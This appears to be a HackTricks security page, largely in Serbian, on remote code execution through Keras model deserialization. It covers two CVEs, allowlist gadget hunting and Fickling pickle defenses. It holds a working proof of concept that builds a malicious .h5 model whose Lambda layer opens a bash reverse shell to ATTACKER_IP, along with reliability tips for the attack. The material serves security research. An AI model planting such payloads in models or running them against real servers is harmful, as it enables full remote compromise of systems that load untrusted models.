# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ova stranica sažima praktične tehnike eksploatacije protiv Keras model deserializacione pipeline, objašnjava interne strukture nativnog .keras formata i površinu napada, i pruža alatni paket za istraživače za pronalaženje Model File Vulnerabilities (MFVs) i post-fix gadgets.

## Interna struktura .keras model formata

.a .keras fajl je ZIP arhiva koja sadrži najmanje:
- metadata.json – opšte informacije (npr., Keras verzija)
- config.json – arhitektura modela (primarna površina napada)
- model.weights.h5 – težine u HDF5

config.json pokreće rekurzivnu deserializaciju: Keras uvozi module, rešava klase/funkcije i rekonstruše slojeve/objekte iz rečnika koje kontroliše napadač.

Primer isečka za objekat tipa Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacija izvršava:
- Uvoz modula i razrešavanje simbola iz module/class_name ključeva
- from_config(...) ili poziv konstruktora sa kwargs pod kontrolom napadača
- Rekurzija u ugnježdene objekte (activations, initializers, constraints, etc.)

Istorijski, ovo je napadaču koji sastavlja config.json izlagalo tri primitiva:
- Kontrola koji moduli se uvoze
- Kontrola koje klase/funkcije se razrešavaju
- Kontrola kwargs prosleđenih konstruktorima/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Osnovni uzrok:
- Lambda.from_config() je koristio python_utils.func_load(...) koji base64-dekodira i poziva marshal.loads() nad bajtovima koje prosledi napadač; Python deserijalizacija može izvršiti kod.

Ideja exploita (pojednostavljen payload u config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Ublažavanje:
- Keras primenjuje safe_mode=True podrazumevano. Serialized Python functions u Lambda su blokirane osim ako korisnik eksplicitno ne isključi sa safe_mode=False.

Napomene:
- Zastareli formati (stariji HDF5 save) ili starije codebase možda ne primenjuju moderne provere, pa “downgrade” style napadi i dalje mogu važiti kada žrtve koriste starije loadere.

## CVE-2025-1550 – Arbitrarni uvoz modula u Keras ≤ 3.8

Osnovni uzrok:
- _retrieve_class_or_fn je koristio neograničen importlib.import_module() sa attacker-controlled module stringovima iz config.json.
- Uticaj: Arbitrarni uvoz bilo kog instaliranog modula (ili modula koji je napadač postavio na sys.path). Kod koji se izvršava pri importovanju se pokreće, zatim se objekat konstruiše sa kwargs koje kontroliše napadač.

Ideja exploita:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: deserialized objects must match expected types

## Praktična eksploatacija: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Mnogi produkcioni stackovi i dalje prihvataju legacy TensorFlow-Keras HDF5 model fajlove (.h5). Ako napadač može otpremiti model koji server kasnije učita ili pokrene za inference, Lambda layer može izvršiti proizvoljan Python pri load/build/predict.

Minimalni PoC za kreiranje zlonamernog .h5 koji izvršava reverse shell kada je deserijalizovan ili upotrebljen:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Napomene i saveti za pouzdanost:
- Trigger points: kod može da se izvrši više puta (npr. tokom layer build/first call, model.load_model, i predict/fit). Neka payloads budu idempotentni.
- Zaključavanje verzije: uskladite TF/Keras/Python mete kako biste izbegli neusklađenosti u serijalizaciji. Na primer, gradite artefakte pod Python 3.8 sa TensorFlow 2.13.1 ako meta koristi tu kombinaciju.
- Brza replikacija okruženja:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validacija: benign payload kao što je os.system("ping -c 1 YOUR_IP") pomaže da se potvrdi izvršenje (npr. posmatrajte ICMP pomoću tcpdump) pre nego što pređete na reverse shell.

## Površina post-fix gadgeta unutar allowlist

Čak i uz allowlisting i safe mode, široka površina ostaje među dozvoljenim Keras callables. Na primer, keras.utils.get_file može da preuzme proizvoljne URLs na lokacije koje korisnik može da izabere.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Važno ograničenje:
- Lambda.call() dodaje input tensor kao prvi pozicioni argument pri pozivu ciljnog callable-a. Chosen gadgets moraju podnositi dodatni pozicioni arg (ili prihvatiti *args/**kwargs). Ovo ograničava koje funkcije su upotrebljive.

## Dozvoljavanje uvoza ML pickle-a za AI/ML modele (Fickling)

Mnogi AI/ML formati modela (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, stariji TensorFlow artefakti, itd.) ugrađuju Python pickle podatke. Napadači rutinski zloupotrebljavaju pickle GLOBAL imports i konstruktore objekata da bi postigli RCE ili zamenili model tokom učitavanja. Skeneri zasnovani na blacklistama često promaše novije ili neregistrovane opasne importe.

Praktična fail-closed odbrana je hook-ovati Python-ov pickle deserializer i dozvoliti samo pregledani skup bezopasnih ML-povezanih importova tokom unpickling-a. Trail of Bits’ Fickling implementira ovu politiku i isporučuje kuriranu ML import allowlist napravljenu iz hiljada javnih Hugging Face pickles.

Bezbednosni model za „bezbedne“ importe (intuicije destilovane iz istraživanja i prakse): importovane simboli koji se koriste u pickle-u moraju istovremeno:
- Ne izvršavati kod niti izazivati izvršavanje (nema kompajliranih/izvornih objekata koda, shell-ovanja, hook-ova, itd.)
- Ne dobijati/postavljati proizvoljne atribute ili stavke
- Ne importovati ili dobijati reference na druge Python objekte iz pickle VM-a
- Ne pokretati sekundarne deserializere (npr. marshal, nested pickle), čak ni indirektno

Omogućite Fickling-ove zaštite što ranije u pokretanju procesa, tako da svi pickle load-ovi koje izvršavaju framework-ovi (torch.load, joblib.load, itd.) budu provereni:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operativni saveti:
- Možete privremeno onemogućiti/ponovo omogućiti hooks gde je potrebno:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ako je poznati ispravan model blokiran, proširite allowlist za vaše okruženje nakon pregleda simbola:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling takođe izlaže generičke runtime garde ako želite finiju kontrolu:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Preferirajte formate modela koji nisu pickle kada je moguće (npr., SafeTensors). Ako morate prihvatiti pickle, pokrećite loadere sa najmanjim privilegijama bez network egress i primenjujte allowlist.

Ova allowlist-first strategija dokazano blokira uobičajene ML pickle exploit puteve dok zadržava visoku kompatibilnost. U ToB-ovom benchmarku, Fickling je označio 100% sintetički malicioznih fajlova i dozvolio ~99% čistih fajlova iz top Hugging Face repos.


## Set alata za istraživače

1) Sistematsko otkrivanje gadgeta u modulima sa allowlistom

Enumerišite kandidatske callables kroz keras, keras_nlp, keras_cv, keras_hub i prioritizujte one sa file/network/process/env side effect-ima.

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direktno testiranje deserializacije (nije potrebna .keras arhiva)

Prosledi pažljivo konstruisane dicts direktno u Keras deserializers da naučiš koje params se prihvataju i posmatraš nuspojave.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Testiranje između verzija i formata

Keras postoji u više kodnih baza/era sa različitim zaštitnim merama i formatima:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, predviđeno za brisanje)
- tf-keras: održavan zasebno
- Multi-backend Keras 3 (official): uveden nativni .keras

Ponavljajte testove kroz različite kodne baze i formate (.keras vs legacy HDF5) kako biste otkrili regresije ili nedostatak zaštitnih mera.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
